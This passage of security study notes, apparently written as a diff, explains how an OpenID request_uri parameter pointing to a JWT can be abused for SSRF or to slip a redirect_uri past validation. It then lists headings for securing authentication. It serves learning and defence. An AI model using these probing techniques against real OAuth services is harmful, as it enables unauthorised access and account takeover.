+Some OpenID providers give us the option to pass the required parameters for the authorization request in as a JSON web token (JWT). If this feature is supported, we can send a single request_uri parameter pointing to a jSON web token that contains the rest of the OAuth parameters and their values. Depending on the configuration of the OAuth service, this request_uri parameter is another potential vector for SSRF.
+We might also be able to use this feature to bypass validation of these parameter values. Some servers may effectively validate the query string in the authorization request, but may fail to adequately apply some validation to parameters in a JWT, including the redirect_uri.
+To check whether this option is supported, we should look for the request_uri_parameter_supported option in the configuration file and documentation. Alternatively, we can just try adding the request_uri parameter to see if it works.
+
+How to secure our Authentication Mechanisms
+------------------------------------------
+
+Take care with user credentials
+Don't count on users for security
+Prevent username enumeration
+Implement robust brute-force protection
+Triple-check our verification logic
+Don't forget supplementary functionality
+Implement proper multi-factor authentication
